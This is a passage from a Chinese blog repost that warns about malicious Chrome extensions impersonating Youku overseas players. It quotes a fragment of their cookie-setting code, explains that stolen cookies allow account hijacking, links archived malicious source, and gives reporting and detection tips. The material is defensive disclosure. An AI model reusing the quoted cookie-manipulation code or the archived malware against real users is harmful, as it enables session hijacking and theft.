+<span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>};</span></span></span>
+
+<span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**function** setCookie(c_name, value, expiredays, path, domain, secure) {</span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**var**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> exdate </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**new**</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>Date</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>();</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>exdate.setDate(exdate.getDate() </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> expiredays);</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> c_name </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>'='</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> escape(value) </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> ((expiredays </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**==**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**null**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**?**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>''</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**:**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>';expires='</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> exdate.toGMTString()) </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (path </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**?**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>';path='</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> path </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**:**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>''</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (domain </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**?**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>';domain='</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> domain </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**:**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>''</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (secure </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**?**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>';secure'</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**:**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>''</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>)</span></span></span></span>
+
+<span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>};</span></span></span></pre>
+
+<p><strong><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>当恶意扩展作者得到用户的 </span></span></span></strong><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><strong><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>cookies </span></span></span></strong></span></span><strong><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>之后不需要密码就可以登入用户的邮箱、社交网络、甚至银行帐户，导致隐私泄漏甚至财产损失。</span></span></span></strong></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>以下内容摘自?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="http://en.wikipedia.org/wiki/HTTP_cookie#Cookie_theft_and_session_hijacking" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Wikipedia</span></span></span></a></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>：</span></span></span></p>
+<blockquote>
+<p><span style="color: #777777;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>If a website uses cookies as session identifiers, attackers can impersonate users’ requests by stealing a full set of victims’ cookies. From the web server’s point of view, a request from an attacker then has the same authentication as the victim’s requests; thus the request is performed on behalf of the victim’s session.</span></span></span></p>
+</blockquote>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>最后说点题外话，那个域名?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;5ihaitao.com&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>?</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>有做过 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>ICP </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>备案，其实可以在</span></span></span><a href="http://www.miibeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>工信部的网站上</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>查到恶意扩展作者的真实姓名</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>…</span></span></span></span></span></p>
+<h3 id="2-优酷海外版（同名扩展）"><a href="#2-优酷海外版（同名扩展）" class="headerlink" title="2. 优酷海外版（同名扩展）"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>2. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>优酷海外版（同名扩展）</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>和上面同名的还有另外一个扩展程序。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>扩展程序链接：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;https://chrome.google.com/webstore/detail/emmoddikhgncnaikamapbkggedoafomi&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意源码存档：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/emmoddikhgncnaikamapbkggedoafomi" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/emmoddikhgncnaikamapbkggedoafomi</span></span></span></a></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>和另外一个优酷海外版扩展的代码基本上一模一样，也是从?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;chrome.5ihaitao.com&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>?</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>请求 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>js </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>文件，猜测是同一个作者所为。</span></span></span></p>
+<h3 id="3-优酷土豆海外播放"><a href="#3-优酷土豆海外播放" class="headerlink" title="3. 优酷土豆海外播放"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>3. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>优酷土豆海外播放</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>扩展程序链接：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;https://chrome.google.com/webstore/detail/aeocankoflefcaiabdkdjkenofcpjagb&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意源码存档：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/aeocankoflefcaiabdkdjkenofcpjagb" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/aeocankoflefcaiabdkdjkenofcpjagb</span></span></span></a></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>和优酷海外版代码也一样，猜测还为同一作者</span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>…</span></span></span></span></span></p>
+<h2 id="如何向-Google-Chrome-团队举报"><a href="#如何向-Google-Chrome-团队举报" class="headerlink" title="如何向 Google Chrome 团队举报"></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>如何向 </strong></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>Google Chrome </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>团队举报</strong></span></span></span></h2><p><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Chrome Web Store </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>现阶段还没有有效的阻止恶意扩展的办法，暂时只能靠用户来主动举报而采取处理。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>另外因为 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Google </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>工作人员有限，可能不能及时地处理举报信息。</span></span></span></p>
+<p><strong><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>于是推荐大家见到恶意扩展都主动去举报下，反馈多了也许才能引起重视。</span></span></span></strong><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>举报恶意扩展的步骤：</span></span></span></p>
+<h4 id="1-在每个扩展程序主页的详细介绍页面都有一个-Report-Abuse-的链接"><a href="#1-在每个扩展程序主页的详细介绍页面都有一个-Report-Abuse-的链接" class="headerlink" title="1. 在每个扩展程序主页的详细介绍页面都有一个 Report Abuse 的链接"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>1. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>在每个扩展程序主页的详细介绍页面都有一个 </strong></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>Report Abuse </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>的链接</strong></span></span></span></h4><h3 id="2-填写表格向-Google-反馈"><a href="#2-填写表格向-Google-反馈" class="headerlink" title="2. 填写表格向 Google 反馈"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>2. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>填写表格向 </strong></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>Google </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>反馈</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>选项可以选择?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;This item contains malware or engages in harmful activity.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>然后反馈的内容可以酌情填写，例如</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;It downloads a malicious javascript code from a remote server which steals and modifies users&#39; cookies.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code></span></span></p>
+<h2 id="甄别恶意扩展的常用办法"><a href="#甄别恶意扩展的常用办法" class="headerlink" title="甄别恶意扩展的常用办法"></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>甄别恶意扩展的常用办法</span></span></span></h2><h3 id="1-要求不必要的权限"><a href="#1-要求不必要的权限" class="headerlink" title="1. 要求不必要的权限"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>1. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>要求不必要的权限</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意扩展一般都要求一些跟功能无关的权限，用于其恶意行为。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>下面为 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Unblock-Youku </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>本身的权限和恶意扩展的权限对比：</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Unblock-Youku</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意扩展程序</span></span></span></p>
+<h3 id="2-制作粗糙"><a href="#2-制作粗糙" class="headerlink" title="2. 制作粗糙"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>2. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>制作粗糙</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意扩展的制作都比较粗糙，没有完善的图标和介绍说明等。</span></span></span></p>
+<h3 id="3-冒充官方帐号或者程序名称"><a href="#3-冒充官方帐号或者程序名称" class="headerlink" title="3. 冒充官方帐号或者程序名称"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>3. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>冒充官方帐号或者程序名称</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>一般冒充官方程序名称的（例如优酷海外版），或者开发者冒充官方帐户的，程序基本上都是有问题的。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Google </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>官方的扩展程序</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>冒充 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Google </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>的恶意程序</span></span></span></p>
+<h3 id="4-用户人数差别"><a href="#4-用户人数差别" class="headerlink" title="4. 用户人数差别"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>4. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>用户人数差别</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>原版的安全的扩展程序一般用户都要比恶意扩展程序多一些，因为原版扩展的存在时间更久，并且了解技术的用户也会主动选择。所以选择用户人数多的扩展程序一般都不会有问题。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Unblock-Youku </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>和恶意扩展程序的活跃用户数对比：</span></span></span></p>
+<h3 id="5-查看用户评论"><a href="#5-查看用户评论" class="headerlink" title="5. 查看用户评论"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>5. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>查看用户评论</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>强烈推荐安装扩展程序之前浏览一下现有用户的评论，特别是 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Recent/</span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>最新 的评论。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>不过有最近别的扩展遭受马甲或者水军的恶意评论，详见</span></span></span><a href="http://bbs.kafan.cn/thread-1513395-1-1.html" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>受害的开发者的原文</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>。</span></span></span></p>
+<h3 id="0xFF-直接检查源码"><a href="#0xFF-直接检查源码" class="headerlink" title="0xFF. 直接检查源码"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>0xFF. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>直接检查源码</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>以上的都是只看表面的办法，不保证完全靠谱。懂技术的同学可以直接检查扩展程序的源代码。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>查看在 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Chrome </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>后台运行的扩展程序的源码可以访问 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>chrome://extensions </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>页面，勾选上 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Dev mode</span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>，然后点击相应扩展程序的 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Inspect views </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>后面的链接就可以看到源码了。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>想不安装扩展程序而直接检查源码的话，可以利用一些工具，例如?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="http://crx.zhuzhu.org/" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>http://crx.zhuzhu.org</span></span></span></a></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>，下载 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>crx </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>安装文件至本地，然后 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>unzip </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>解压缩就可以直接看到所有的源代码了。</span></span></span></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://itmaktub.com/2013/11/09/safe_of_chrome/" data-title="恶意扩展程序列表及甄别办法 | 哼嘿哈嘿哈的博客" data-tsina="null" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2013/11/11/ok6410_install_debian/" title="OK6410安装Debian文件系统">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  OK6410安装Debian文件系统</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2013/11/05/hide_run_goagent/"  title="后台运行goagent 告别烦人的前台窗口">
+ <strong>NEXT:</strong><br/> 
+ <span>后台运行goagent 告别烦人的前台窗口
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#附-Unblock-Youku作者写的《-恶意扩展程序列表及甄别办法》一篇"><span class="toc-number">1.</span> <span class="toc-text">附**Unblock-Youku作者写的《**恶意扩展程序列表及甄别办法》一篇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原文：http-uku-im-malicious"><span class="toc-number">2.</span> <span class="toc-text">原文：http://uku.im/malicious</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#恶意扩展不完全列表"><span class="toc-number">3.</span> <span class="toc-text">恶意扩展不完全列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-优酷海外版"><span class="toc-number">3.1.</span> <span class="toc-text">1. 优酷海外版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-优酷海外版（同名扩展）"><span class="toc-number">3.2.</span> <span class="toc-text">2. 优酷海外版（同名扩展）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-优酷土豆海外播放"><span class="toc-number">3.3.</span> <span class="toc-text">3. 优酷土豆海外播放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何向-Google-Chrome-团队举报"><span class="toc-number">4.</span> <span class="toc-text">如何向 Google Chrome 团队举报</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-在每个扩展程序主页的详细介绍页面都有一个-Report-Abuse-的链接"><span class="toc-number">4.0.1.</span> <span class="toc-text">1. 在每个扩展程序主页的详细介绍页面都有一个 Report Abuse 的链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-填写表格向-Google-反馈"><span class="toc-number">4.1.</span> <span class="toc-text">2. 填写表格向 Google 反馈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#甄别恶意扩展的常用办法"><span class="toc-number">5.</span> <span class="toc-text">甄别恶意扩展的常用办法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-要求不必要的权限"><span class="toc-number">5.1.</span> <span class="toc-text">1. 要求不必要的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-制作粗糙"><span class="toc-number">5.2.</span> <span class="toc-text">2. 制作粗糙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-冒充官方帐号或者程序名称"><span class="toc-number">5.3.</span> <span class="toc-text">3. 冒充官方帐号或者程序名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-用户人数差别"><span class="toc-number">5.4.</span> <span class="toc-text">4. 用户人数差别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-查看用户评论"><span class="toc-number">5.5.</span> <span class="toc-text">5. 查看用户评论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0xFF-直接检查源码"><span class="toc-number">5.6.</span> <span class="toc-text">0xFF. 直接检查源码</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
